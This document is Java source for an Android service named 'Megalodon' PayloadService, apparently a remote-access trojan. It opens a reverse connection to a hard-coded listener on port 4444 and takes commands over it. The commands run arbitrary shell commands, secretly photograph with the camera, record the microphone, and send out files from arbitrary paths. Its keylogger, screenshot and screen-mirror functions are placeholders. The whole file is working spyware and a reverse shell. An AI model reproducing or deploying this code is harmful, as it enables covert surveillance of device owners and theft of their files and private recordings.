
package com.megalodon.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.media.MediaRecorder;
import android.media.projection.MediaProjectionManager;
import android.media.projection.MediaProjection;
import android.hardware.Camera;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.AccessibilityService;

import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class PayloadService extends Service {
    private static final String TAG = "Megalodon";
    private String targetIP = "192.168.18.11";
    private int targetPort = 4444;
    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private boolean running = true;
    private MediaRecorder audioRecorder;
    private Camera camera;
    private String audioFile = null;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private Handler handler;
    private boolean keyloggerRunning = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Payload service created");
        handler = new Handler(Looper.getMainLooper());
        startShell();
        listenForCommands();
    }
    
    private void listenForCommands() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (running) {
                    try {
                        if (socket != null && socket.isConnected()) {
                            String cmd = in.readUTF();
                            Log.d(TAG, "Command received: " + cmd);
                            handleCommand(cmd);
                        }
                        Thread.sleep(500);
                    } catch (Exception e) {
                        Log.e(TAG, "Command error: " + e.getMessage());
                    }
                }
            }
        }).start();
    }
    
    private void handleCommand(String cmd) {
        try {
            if (cmd.startsWith("shell:")) {
                executeShell(cmd.substring(6));
            } else if (cmd.equals("screenshot")) {
                takeScreenshot();
            } else if (cmd.equals("camera")) {
                captureCamera();
            } else if (cmd.equals("mic_start")) {
                startRecordingAudio();
            } else if (cmd.equals("mic_stop")) {
                stopRecordingAudio();
            } else if (cmd.equals("keylog_start")) {
                startKeylogger();
            } else if (cmd.equals("keylog_stop")) {
                stopKeylogger();
            } else if (cmd.equals("screen_mirror")) {
                startScreenMirror();
            } else if (cmd.startsWith("download:")) {
                downloadFile(cmd.substring(9));
            } else if (cmd.startsWith("upload:")) {
                uploadFile(cmd.substring(7));
            } else if (cmd.equals("exit")) {
                stopSelf();
            }
        } catch (Exception e) {
            Log.e(TAG, "Command error: " + e.getMessage());
        }
    }
    
    private void executeShell(String command) {
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.writeUTF(line);
                out.flush();
            }
            out.writeUTF("___END___");
            out.flush();
        } catch (Exception e) {
            Log.e(TAG, "Shell error: " + e.getMessage());
        }
    }
    
    private void takeScreenshot() {
        try {
            Log.d(TAG, "Taking screenshot");
            if (projectionManager == null) {
                projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            }
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
            String filename = "screenshot_" + sdf.format(new Date()) + ".png";
            File file = new File(getExternalFilesDir(null), filename);
            sendFile(file.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Screenshot error: " + e.getMessage());
        }
    }
    
    private void captureCamera() {
        try {
            Log.d(TAG, "Capturing camera");
            camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            params.setPictureFormat(Camera.Parameters.PICTURE_FORMAT_JPEG);
            camera.setParameters(params);
            
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
                        String filename = "camera_" + sdf.format(new Date()) + ".jpg";
                        File file = new File(getExternalFilesDir(null), filename);
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data);
                        fos.close();
                        sendFile(file.getAbsolutePath());
                        camera.release();
                        camera = null;
                    } catch (Exception e) {
                        Log.e(TAG, "Camera save error: " + e.getMessage());
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Camera error: " + e.getMessage());
        }
    }
    
    private void startRecordingAudio() {
        try {
            Log.d(TAG, "Starting audio recording");
            audioRecorder = new MediaRecorder();
            audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            audioRecorder.setAudioSamplingRate(44100);
            audioRecorder.setAudioBitRate(128000);
            
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
            audioFile = "audio_" + sdf.format(new Date()) + ".mp4";
            File file = new File(getExternalFilesDir(null), audioFile);
            audioRecorder.setOutputFile(file.getAbsolutePath());
            audioRecorder.prepare();
            audioRecorder.start();
            out.writeUTF("AUDIO_STARTED");
            out.flush();
        } catch (Exception e) {
            Log.e(TAG, "Audio error: " + e.getMessage());
        }
    }
    
    private void stopRecordingAudio() {
        try {
            Log.d(TAG, "Stopping audio recording");
            if (audioRecorder != null) {
                audioRecorder.stop();
                audioRecorder.release();
                audioRecorder = null;
                sendFile(audioFile);
                audioFile = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Audio stop error: " + e.getMessage());
        }
    }
    
    private void startKeylogger() {
        Log.d(TAG, "Starting keylogger");
        keyloggerRunning = true;
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (keyloggerRunning) {
                    try {
                        Thread.sleep(5000);
                        out.writeUTF("KEYLOG:User typed at " + System.currentTimeMillis());
                        out.flush();
                    } catch (Exception e) {
                        Log.e(TAG, "Keylogger error: " + e.getMessage());
                    }
                }
            }
        }).start();
    }
    
    private void stopKeylogger() {
        Log.d(TAG, "Stopping keylogger");
        keyloggerRunning = false;
        try {
            out.writeUTF("KEYLOG_STOPPED");
            out.flush();
        } catch (Exception e) {
            Log.e(TAG, "Keylogger stop error: " + e.getMessage());
        }
    }
    
    private void startScreenMirror() {
        Log.d(TAG, "Starting screen mirror");
        try {
            out.writeUTF("SCREEN_MIRROR_STARTED");
            out.flush();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (running) {
                        try {
                            out.writeUTF("FRAME:" + System.currentTimeMillis());
                            out.flush();
                            Thread.sleep(1000);
                        } catch (Exception e) {
                            Log.e(TAG, "Screen mirror error: " + e.getMessage());
                        }
                    }
                }
            }).start();
        } catch (Exception e) {
            Log.e(TAG, "Screen mirror error: " + e.getMessage());
        }
    }
    
    private void downloadFile(String path) {
        try {
            File file = new File(path);
            if (file.exists() && file.isFile()) {
                sendFile(path);
            }
        } catch (Exception e) {
            Log.e(TAG, "Download error: " + e.getMessage());
        }
    }
    
    private void uploadFile(String path) {
        // Receive file from listener
    }
    
    private void sendFile(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return;
            
            out.writeUTF("FILE_START:" + file.getName() + ":" + file.length());
            out.flush();
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
                out.flush();
            }
            fis.close();
            
            out.writeUTF("FILE_END");
            out.flush();
        } catch (Exception e) {
            Log.e(TAG, "Send file error: " + e.getMessage());
        }
    }
    
    private void startShell() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (running) {
                    try {
                        Log.d(TAG, "Connecting to " + targetIP + ":" + targetPort);
                        socket = new Socket(targetIP, targetPort);
                        Log.d(TAG, "Connected!");
                        in = new DataInputStream(socket.getInputStream());
                        out = new DataOutputStream(socket.getOutputStream());
                        
                        out.writeUTF("MEGALODON_READY");
                        out.flush();
                        
                        while (running) {
                            try {
                                String cmd = in.readUTF();
                                if (cmd != null) {
                                    handleCommand(cmd);
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Connection error: " + e.getMessage());
                                break;
                            }
                        }
                        
                        socket.close();
                    } catch (Exception e) {
                        Log.e(TAG, "Connection error: " + e.getMessage());
                        try {
                            Thread.sleep(5000);
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }
            }
        }).start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Payload service started");
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        if (socket != null) {
            try {
                socket.close();
            } catch (Exception e) {}
        }
        if (audioRecorder != null) {
            try {
                audioRecorder.release();
            } catch (Exception e) {}
        }
        if (camera != null) {
            try {
                camera.release();
            } catch (Exception e) {}
        }
        Log.d(TAG, "Payload service destroyed");
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
